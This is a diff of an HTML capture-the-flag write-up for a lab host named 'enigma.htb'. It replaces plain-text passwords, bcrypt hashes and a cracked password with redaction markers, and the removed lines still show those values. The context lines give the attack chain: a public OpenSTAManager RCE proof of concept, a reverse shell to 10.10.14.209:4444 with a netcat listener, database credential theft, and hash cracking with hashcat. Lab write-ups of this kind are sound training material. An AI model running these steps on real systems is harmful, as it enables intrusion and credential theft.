@@ -193,7 +193,7 @@
           involving crafted <code>.p7m</code> invoice upload filenames. The exploit produced a reverse shell as
           <code>www-data</code>. Post-exploitation enumeration revealed database credentials in
           <code>config.inc.php</code>. The application database contained bcrypt password hashes, and the hash for
-          <code>haris</code> was cracked with Hashcat as <code>bestfriends</code>. This password allowed a local user pivot
+          <code>haris</code> was cracked with Hashcat. This password allowed a local user pivot
           from <code>www-data</code> to <code>haris</code> and retrieval of the user flag.
         </p>
         <p>
@@ -315,7 +315,7 @@ ls -la nfs</code></pre>
           <tbody>
             <tr><th>Employee</th><td>Kevin Mitchell</td></tr>
             <tr><th>Username</th><td><code>kevin</code></td></tr>
-            <tr><th>Password</th><td><code>Enigma2024!</code></td></tr>
+            <tr><th>Password</th><td><code>[REDACTED]</code></td></tr>
             <tr><th>Mail URL</th><td><code>http://mail001.enigma.htb</code></td></tr>
           </tbody>
         </table>
@@ -345,7 +345,7 @@ whatweb http://mail001.enigma.htb</code></pre>
         </p>
         <pre><code>URL: http://support_001.enigma.htb
 Username: admin
-Password: Ne3s4rtars78s</code></pre>
+Password: [REDACTED]</code></pre>
 
         <div class="callout success">
           The discovered OpenSTAManager administrator credentials became the next exploitation path.
@@ -425,7 +425,7 @@ cd CVE-2025-69212-Authenticated-RCE-PoC</code></pre>
         <pre><code>python3 exploit.py \
   -u http://support_001.enigma.htb \
   -l admin \
-  -p 'Ne3s4rtars78s' \
+  -p '[REDACTED]' \
   -c 'id'</code></pre>
 
         <h3>Reverse Shell</h3>
@@ -436,7 +436,7 @@ nc -lvnp 4444
 python3 exploit.py \
   -u http://support_001.enigma.htb \
   -l admin \
-  -p 'Ne3s4rtars78s' \
+  -p '[REDACTED]' \
   -s 10.10.14.209 \
   -P 4444</code></pre>
         <pre><code>Connection received on 10.129.25.4
@@ -455,11 +455,11 @@ www-data@enigma:~/html/openstamanager$</code></pre>
         <pre><code>cat config.inc.php</code></pre>
         <pre><code>$db_host = 'localhost';
 $db_username = 'brollin';
-$db_password = 'Fri3nds@9099';
+$db_password = '[REDACTED]';
 $db_name = 'openstamanager';</code></pre>
 
         <h3>MySQL Login</h3>
-        <pre><code>mysql -u brollin -p'Fri3nds@9099' openstamanager</code></pre>
+        <pre><code>mysql -u brollin -p'[REDACTED]' openstamanager</code></pre>
 
         <h3>User Table Discovery</h3>
         <pre><code>SHOW TABLES;
@@ -468,8 +468,8 @@ SELECT * FROM zz_users;</code></pre>
         <pre><code>+----+----------+--------------------------------------------------------------+------------------+
 | id | username | password                                                     | email            |
 +----+----------+--------------------------------------------------------------+------------------+
-|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |
-|  2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |
+|  1 | admin    | [REDACTED]                                                   | admin@enigma.htb |
+|  2 | haris    | [REDACTED]                                                   | haris@enigma.htb |
 +----+----------+--------------------------------------------------------------+------------------+</code></pre>
 
         <div class="callout success">
@@ -486,11 +486,11 @@ SELECT * FROM zz_users;</code></pre>
         </p>
         <pre><code>hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --username
 hashcat -m 3200 hashes.txt --username --show</code></pre>
-        <pre><code>haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends</code></pre>
+        <pre><code>haris:[REDACTED]:[REDACTED]</code></pre>
 
         <h3>Pivot to haris</h3>
         <pre><code>su haris
-Password: bestfriends</code></pre>
+Password: [REDACTED]</code></pre>
         <pre><code>haris@enigma:/var/www/html/openstamanager$ whoami
 haris</code></pre>
 
@@ -616,7 +616,7 @@ root</code></pre>
       <section>
         <h2>Flags</h2>
         <pre><code>user.txt: [REDACTED]
-root.txt: [REDACRED]</code></pre>
+root.txt: [REDACTED]</code></pre>
       </section>
 
       <section>
@@ -693,7 +693,7 @@ root.txt: [REDACRED]</code></pre>
 9. A public authenticated RCE PoC for OpenSTAManager produced a www-data shell.
 10. config.inc.php exposed MySQL credentials for the openstamanager database.
 11. The zz_users table contained bcrypt hashes for admin and haris.
-12. Hashcat cracked haris as bestfriends.
+12. Hashcat cracked haris' password.
 13. su haris provided local user access and user.txt.
 14. Local enumeration found OliveTin on 127.0.0.1:1337 running as root.
 15. /etc/OliveTin/config.yaml showed Backup Database accepted db_user, db_pass, and db_name arguments.
